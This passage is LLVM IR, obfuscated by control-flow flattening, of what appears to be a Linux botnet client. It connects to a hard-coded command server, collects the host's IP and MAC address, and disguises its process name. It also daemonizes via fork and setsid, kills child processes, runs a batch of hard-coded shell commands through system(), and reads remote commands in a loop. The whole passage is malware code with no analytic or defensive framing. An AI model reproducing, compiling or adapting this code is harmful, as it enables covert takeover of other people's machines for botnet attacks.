  %708 = load i8*, i8** %707, align 8
  %709 = call i32 @strcmp(i8* %708, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.106, i32 0, i32 0)) #10
  %710 = icmp ne i32 %709, 0
  %711 = select i1 %710, i32 -1308116335, i32 1873992656
  store i32 %711, i32* %switchVar
  br label %loopEnd

; <label>:712:                                    ; preds = %loopEntry
  store i32 0, i32* %38, align 4
  store i64 0, i64* %39, align 8
  store i32 -1672390657, i32* %switchVar
  br label %loopEnd

; <label>:713:                                    ; preds = %loopEntry
  %714 = load i64, i64* %39, align 8
  %715 = load i64, i64* @numpids, align 8
  %716 = icmp ult i64 %714, %715
  %717 = select i1 %716, i32 -1893758695, i32 -695588322
  store i32 %717, i32* %switchVar
  br label %loopEnd

; <label>:718:                                    ; preds = %loopEntry
  %719 = load i32*, i32** @pids, align 8
  %720 = load i64, i64* %39, align 8
  %721 = getelementptr inbounds i32, i32* %719, i64 %720
  %722 = load i32, i32* %721, align 4
  %723 = icmp ne i32 %722, 0
  %724 = select i1 %723, i32 1744377958, i32 -887669265
  store i32 %724, i32* %switchVar
  br label %loopEnd

; <label>:725:                                    ; preds = %loopEntry
  %726 = load i32*, i32** @pids, align 8
  %727 = load i64, i64* %39, align 8
  %728 = getelementptr inbounds i32, i32* %726, i64 %727
  %729 = load i32, i32* %728, align 4
  %730 = call i32 @getpid() #2
  %731 = icmp ne i32 %729, %730
  %732 = select i1 %731, i32 -1774076593, i32 -887669265
  store i32 %732, i32* %switchVar
  br label %loopEnd

; <label>:733:                                    ; preds = %loopEntry
  %734 = load i32*, i32** @pids, align 8
  %735 = load i64, i64* %39, align 8
  %736 = getelementptr inbounds i32, i32* %734, i64 %735
  %737 = load i32, i32* %736, align 4
  %738 = call i32 @kill(i32 %737, i32 9) #2
  %739 = load i32, i32* %38, align 4
  %740 = add nsw i32 %739, 1
  store i32 %740, i32* %38, align 4
  store i32 -887669265, i32* %switchVar
  br label %loopEnd

; <label>:741:                                    ; preds = %loopEntry
  store i32 207364916, i32* %switchVar
  br label %loopEnd

; <label>:742:                                    ; preds = %loopEntry
  %743 = load i64, i64* %39, align 8
  %744 = add i64 %743, 1
  store i64 %744, i64* %39, align 8
  store i32 -1672390657, i32* %switchVar
  br label %loopEnd

; <label>:745:                                    ; preds = %loopEntry
  store i32 -1308116335, i32* %switchVar
  br label %loopEnd

; <label>:746:                                    ; preds = %loopEntry
  %747 = load i8**, i8*** %4, align 8
  %748 = getelementptr inbounds i8*, i8** %747, i64 0
  %749 = load i8*, i8** %748, align 8
  %750 = call i32 @strcmp(i8* %749, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.107, i32 0, i32 0)) #10
  %751 = icmp ne i32 %750, 0
  %752 = select i1 %751, i32 -2146890788, i32 -63161668
  store i32 %752, i32* %switchVar
  br label %loopEnd

; <label>:753:                                    ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:754:                                    ; preds = %loopEntry
  %755 = load i8**, i8*** %4, align 8
  %756 = getelementptr inbounds i8*, i8** %755, i64 0
  %757 = load i8*, i8** %756, align 8
  %758 = call i32 @strcmp(i8* %757, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.108, i32 0, i32 0)) #10
  %759 = icmp ne i32 %758, 0
  %760 = select i1 %759, i32 196278165, i32 1000124678
  store i32 %760, i32* %switchVar
  br label %loopEnd

; <label>:761:                                    ; preds = %loopEntry
  %762 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.109, i32 0, i32 0))
  %763 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.110, i32 0, i32 0))
  %764 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.111, i32 0, i32 0))
  %765 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.112, i32 0, i32 0))
  %766 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.113, i32 0, i32 0))
  %767 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.114, i32 0, i32 0))
  %768 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.115, i32 0, i32 0))
  %769 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.116, i32 0, i32 0))
  store i32 196278165, i32* %switchVar
  br label %loopEnd

; <label>:770:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %761, %754, %746, %745, %742, %741, %733, %725, %718, %713, %712, %705, %704, %695, %691, %690, %688, %676, %672, %669, %664, %663, %658, %654, %653, %648, %630, %629, %622, %618, %611, %607, %600, %593, %589, %582, %581, %573, %569, %568, %566, %553, %549, %546, %530, %529, %522, %515, %511, %504, %503, %498, %494, %493, %491, %481, %477, %474, %458, %457, %450, %443, %439, %432, %408, %404, %403, %396, %389, %385, %378, %377, %369, %365, %364, %362, %351, %347, %344, %339, %338, %333, %314, %313, %306, %302, %295, %288, %281, %274, %270, %263, %262, %257, %253, %252, %250, %240, %236, %233, %217, %216, %209, %202, %198, %191, %190, %185, %181, %180, %178, %170, %166, %163, %147, %146, %139, %132, %128, %121, %120, %116, %115, %111, %109, %104, %103, %99, %92, %87, %86, %82, %75, %72, %68, %61, %56, %49, %46, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -601433430, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -601433430, label %first
    i32 -1509392206, label %8
    i32 1444685211, label %11
    i32 -1183658681, label %17
    i32 -873976718, label %18
    i32 -1291068289, label %21
    i32 353100578, label %32
    i32 -730741242, label %39
    i32 -1027304850, label %47
    i32 2106616128, label %48
    i32 86644954, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp ne i32 %.reload, 0
  %7 = select i1 %6, i32 -1509392206, i32 1444685211
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* @mainCommSock, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* @mainCommSock, align 4
  store i32 1444685211, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* @currentServer, align 4
  %13 = add nsw i32 %12, 1
  %14 = sext i32 %13 to i64
  %15 = icmp eq i64 %14, 1
  %16 = select i1 %15, i32 -1183658681, i32 -873976718
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 0, i32* @currentServer, align 4
  store i32 -1291068289, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* @currentServer, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* @currentServer, align 4
  store i32 -1291068289, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %23 = load i32, i32* @currentServer, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %24
  %26 = load i8*, i8** %25, align 8
  %27 = call i8* @strcpy(i8* %22, i8* %26) #2
  store i32 23, i32* %3, align 4
  %28 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %29 = call i8* @strchr(i8* %28, i32 58) #10
  %30 = icmp ne i8* %29, null
  %31 = select i1 %30, i32 353100578, i32 -730741242
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %34 = call i8* @strchr(i8* %33, i32 58) #10
  %35 = getelementptr inbounds i8, i8* %34, i64 1
  %36 = call i32 @atoi(i8* %35) #10
  store i32 %36, i32* %3, align 4
  %37 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %38 = call i8* @strchr(i8* %37, i32 58) #10
  store i8 0, i8* %38, align 1
  store i32 -730741242, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %40, i32* @mainCommSock, align 4
  %41 = load i32, i32* @mainCommSock, align 4
  %42 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %43 = load i32, i32* %3, align 4
  %44 = call i32 @connectTimeout(i32 %41, i8* %42, i32 %43, i32 30)
  %45 = icmp ne i32 %44, 0
  %46 = select i1 %45, i32 2106616128, i32 -1027304850
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 1, i32* %1, align 4
  store i32 86644954, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 86644954, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %48, %47, %39, %32, %21, %18, %17, %11, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1778193307, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1778193307, label %first
    i32 400811368, label %16
    i32 -1087924335, label %17
    i32 1254282133, label %31
    i32 -1815572013, label %32
    i32 759768435, label %39
    i32 413430724, label %40
    i32 -1110067368, label %45
    i32 449039985, label %51
    i32 378555119, label %56
    i32 -83453507, label %58
    i32 -2066287793, label %64
    i32 124228742, label %67
    i32 1444863811, label %69
    i32 989229981, label %71
    i32 913304164, label %78
    i32 1684668035, label %86
    i32 1566596922, label %90
    i32 1021956769, label %102
    i32 1030771867, label %105
    i32 -785286691, label %106
    i32 1170496502, label %109
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp eq i32 %.reload, -1
  %15 = select i1 %14, i32 400811368, i32 -1087924335
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 1170496502, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.117, i32 0, i32 0)) #2
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %22 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i32 0, i32 0
  store i32 %20, i32* %22, align 4
  %23 = call zeroext i16 @htons(i16 zeroext 53) #13
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %23, i16* %24, align 2
  %25 = load i32, i32* %2, align 4
  %26 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %27 = call i32 @connect(i32 %25, %struct.sockaddr* %26, i32 16)
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, -1
  %30 = select i1 %29, i32 1254282133, i32 -1815572013
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 1170496502, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 16, i32* %6, align 4
  %33 = load i32, i32* %2, align 4
  %34 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %35 = call i32 @getsockname(i32 %33, %struct.sockaddr* %34, i32* %6) #2
  store i32 %35, i32* %4, align 4
  %36 = load i32, i32* %4, align 4
  %37 = icmp eq i32 %36, -1
  %38 = select i1 %37, i32 759768435, i32 413430724
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 1170496502, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %42 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %41, i32 0, i32 0
  %43 = load i32, i32* %42, align 4
  store i32 %43, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %44 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.118, i32 0, i32 0), i32 0)
  store i32 %44, i32* %7, align 4
  store i32 -1110067368, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %47 = load i32, i32* %7, align 4
  %48 = call i8* @fdgets(i8* %46, i32 4096, i32 %47)
  %49 = icmp ne i8* %48, null
  %50 = select i1 %49, i32 449039985, i32 989229981
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %53 = call i8* @strstr(i8* %52, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.119, i32 0, i32 0)) #10
  %54 = icmp ne i8* %53, null
  %55 = select i1 %54, i32 378555119, i32 1444863811
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %57, i8** %9, align 8
  store i32 -83453507, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i8*, i8** %9, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp ne i32 %61, 9
  %63 = select i1 %62, i32 -2066287793, i32 124228742
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i8*, i8** %9, align 8
  %66 = getelementptr inbounds i8, i8* %65, i32 1
  store i8* %66, i8** %9, align 8
  store i32 -83453507, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8*, i8** %9, align 8
  store i8 0, i8* %68, align 1
  store i32 989229981, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %70, i8 0, i64 4096, i32 16, i1 false)
  store i32 -1110067368, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %7, align 4
  %73 = call i32 @close(i32 %72)
  %74 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %75 = load i8, i8* %74, align 16
  %76 = icmp ne i8 %75, 0
  %77 = select i1 %76, i32 913304164, i32 -785286691
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %80 = bitcast %union.anon.6* %79 to [16 x i8]*
  %81 = getelementptr inbounds [16 x i8], [16 x i8]* %80, i32 0, i32 0
  %82 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %83 = call i8* @strcpy(i8* %81, i8* %82) #2
  %84 = load i32, i32* %2, align 4
  %85 = call i32 (i32, i64, ...) @ioctl(i32 %84, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  store i32 1684668035, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %10, align 4
  %88 = icmp slt i32 %87, 6
  %89 = select i1 %88, i32 1566596922, i32 1030771867
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %92 = bitcast %union.anon.7* %91 to %struct.sockaddr*
  %93 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %92, i32 0, i32 1
  %94 = getelementptr inbounds [14 x i8], [14 x i8]* %93, i32 0, i32 0
  %95 = load i32, i32* %10, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  %98 = load i8, i8* %97, align 1
  %99 = load i32, i32* %10, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %100
  store i8 %98, i8* %101, align 1
  store i32 1021956769, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %10, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %10, align 4
  store i32 1684668035, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 -785286691, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  %108 = call i32 @close(i32 %107)
  store i32 1170496502, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i32, i32* %1, align 4
  ret i32 %110

loopEnd:                                          ; preds = %106, %105, %102, %90, %86, %78, %71, %69, %67, %64, %58, %56, %51, %45, %40, %39, %32, %31, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.120, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [1024 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca [10 x i8*], align 16
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.121, i32 0, i32 0), i8** %6, align 8
  %25 = call i8* @getBuild()
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.122, i32 0, i32 0), i8* %25)
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 0
  %32 = load i8*, i8** %31, align 8
  %33 = call i64 @strlen(i8* %32) #10
  %34 = call i8* @strncpy(i8* %29, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.123, i32 0, i32 0), i64 %33) #2
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 0
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.121, i32 0, i32 0), i8** %36, align 8
  %37 = load i8*, i8** %6, align 8
  %38 = ptrtoint i8* %37 to i64
  %39 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %38, i32 0, i32 0, i32 0)
  %40 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %41 = call i32 @getpid() #2
  %42 = xor i32 %40, %41
  call void @srand(i32 %42) #2
  %43 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %44 = call i32 @getpid() #2
  %45 = xor i32 %43, %44
  call void @init_rand(i32 %45)
  %46 = call i32 @getOurIP()
  %47 = call i32 @fork() #2
  store i32 %47, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %7, align 4
  %switchVar = alloca i32
  store i32 -1865010839, i32* %switchVar
  %.reg2mem3 = alloca i1
  %.reg2mem5 = alloca i1
  %.reg2mem7 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1865010839, label %first
    i32 1532769716, label %50
    i32 1672335564, label %53
    i32 -1199484571, label %57
    i32 -2058029540, label %61
    i32 1491741672, label %62
    i32 -1726490415, label %66
    i32 872295731, label %67
    i32 -1445509013, label %68
    i32 -2079828899, label %69
    i32 820903521, label %70
    i32 318590781, label %71
    i32 586131711, label %72
    i32 -208711268, label %76
    i32 2060893878, label %80
    i32 784273155, label %82
    i32 1589035615, label %86
    i32 730957719, label %92
    i32 1063275455, label %93
    i32 -1690214552, label %99
    i32 -1219348034, label %108
    i32 91225015, label %111
    i32 -1825310589, label %117
    i32 -2038945979, label %128
    i32 -1163884080, label %131
    i32 440952719, label %144
    i32 19627121, label %150
    i32 1288944268, label %160
    i32 721266104, label %163
    i32 672750451, label %167
    i32 870772919, label %168
    i32 -1124560726, label %171
    i32 1241800617, label %181
    i32 1391555817, label %184
    i32 1623437204, label %190
    i32 -1659525967, label %191
    i32 1052850751, label %198
    i32 1564218396, label %201
    i32 763521479, label %207
    i32 -1819910610, label %212
    i32 43709603, label %214
    i32 -1323892405, label %217
    i32 -1894499510, label %223
    i32 -745724065, label %224
    i32 -1606403652, label %233
    i32 -700407214, label %243
    i32 231540791, label %252
    i32 1351526332, label %254
    i32 -639236756, label %260
    i32 -1736587219, label %262
    i32 -2099045677, label %268
    i32 -101052717, label %273
    i32 1768613994, label %275
    i32 10326768, label %278
    i32 844569528, label %283
    i32 -1336823926, label %288
    i32 -709375106, label %297
    i32 -829142402, label %302
    i32 1990936175, label %306
    i32 1981161382, label %307
    i32 724651742, label %314
    i32 -1401962062, label %320
    i32 788305330, label %324
    i32 1456797452, label %327
    i32 -1855433445, label %332
    i32 7185758, label %336
    i32 2121359616, label %342
    i32 -1566778553, label %365
    i32 336314550, label %367
    i32 -179801330, label %373
    i32 -631534329, label %374
    i32 397697306, label %379
    i32 1297920983, label %384
    i32 -1996519719, label %387
    i32 1213739840, label %388
    i32 -935221632, label %389
    i32 -398763210, label %390
    i32 -902910656, label %391
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %48 = icmp ne i32 %.reload, 0
  %49 = select i1 %48, i32 1532769716, i32 1672335564
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i32, i32* %7, align 4
  %52 = call i32 @waitpid(i32 %51, i32* %9, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i32, i32* %7, align 4
  %55 = icmp ne i32 %54, 0
  %56 = select i1 %55, i32 820903521, i32 -1199484571
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = call i32 @fork() #2
  store i32 %58, i32* %8, align 4
  %59 = icmp ne i32 %58, 0
  %60 = select i1 %59, i32 -2058029540, i32 1491741672
  store i32 %60, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %8, align 4
  %64 = icmp ne i32 %63, 0
  %65 = select i1 %64, i32 872295731, i32 -1726490415
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 -1445509013, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 -1445509013, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 -2079828899, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  store i32 318590781, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  store i32 318590781, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  store i32 586131711, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = call i32 @setsid() #2
  %74 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i32 0, i32 0)) #2
  %75 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  store i32 -208711268, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = call i32 @initConnection()
  %78 = icmp ne i32 %77, 0
  %79 = select i1 %78, i32 2060893878, i32 784273155
  store i32 %79, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = call i32 @sleep(i32 5)
  store i32 -208711268, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* @mainCommSock, align 4
  %84 = call i8* @getBuild()
  %85 = call i32 (i32, i8*, ...) @sockprintf(i32 %83, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.125, i32 0, i32 0), i8* %84)
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  store i32 1589035615, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* @mainCommSock, align 4
  %88 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %89 = call i32 @recvLine(i32 %87, i8* %88, i32 4096)
  store i32 %89, i32* %11, align 4
  %90 = icmp ne i32 %89, -1
  %91 = select i1 %90, i32 730957719, i32 -398763210
  store i32 %91, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  store i32 0, i32* %12, align 4
  store i32 1063275455, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %12, align 4
  %95 = sext i32 %94 to i64
  %96 = load i64, i64* @numpids, align 8
  %97 = icmp ult i64 %95, %96
  %98 = select i1 %97, i32 -1690214552, i32 -1124560726
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i32*, i32** @pids, align 8
  %101 = load i32, i32* %12, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i32, i32* %100, i64 %102
  %104 = load i32, i32* %103, align 4
  %105 = call i32 @waitpid(i32 %104, i32* null, i32 1)
  %106 = icmp sgt i32 %105, 0
  %107 = select i1 %106, i32 -1219348034, i32 672750451
  store i32 %107, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  %109 = load i32, i32* %12, align 4
  %110 = add nsw i32 %109, 1
  store i32 %110, i32* %14, align 4
  store i32 91225015, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %14, align 4
  %113 = zext i32 %112 to i64
  %114 = load i64, i64* @numpids, align 8
  %115 = icmp ult i64 %113, %114
  %116 = select i1 %115, i32 -1825310589, i32 -1163884080
  store i32 %116, i32* %switchVar
  br label %loopEnd

